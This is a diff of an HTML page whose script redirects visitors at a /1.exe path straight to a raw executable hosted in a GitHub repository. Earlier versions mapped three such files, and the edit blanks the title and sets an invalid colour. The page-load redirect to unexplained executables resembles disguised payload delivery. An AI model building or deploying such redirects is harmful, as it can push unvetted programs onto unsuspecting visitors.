@@ -2,10 +2,10 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Download</title>
+    <title></title>
     <style>
         body { 
-            background: #000000; 
+            background: #FFFFF; 
             margin: 0; 
             padding: 0; 
             overflow: hidden;
@@ -14,18 +14,10 @@
     <script>
         // Get current path
         const path = window.location.pathname;
-        const filename = path.split('/').pop();
         
-        // File mapping
-        const files = {
-            '1.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe',
-            '2.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/2.exe',
-            '3.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/3.exe'
-        };
-        
-        // Redirect if file exists
-        if (files[filename]) {
-            window.location.href = files[filename];
+        // If path ends with /1.exe, redirect to download
+        if (path.endsWith('/1.exe')) {
+            window.location.href = 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe';
         }
     </script>
 </head>
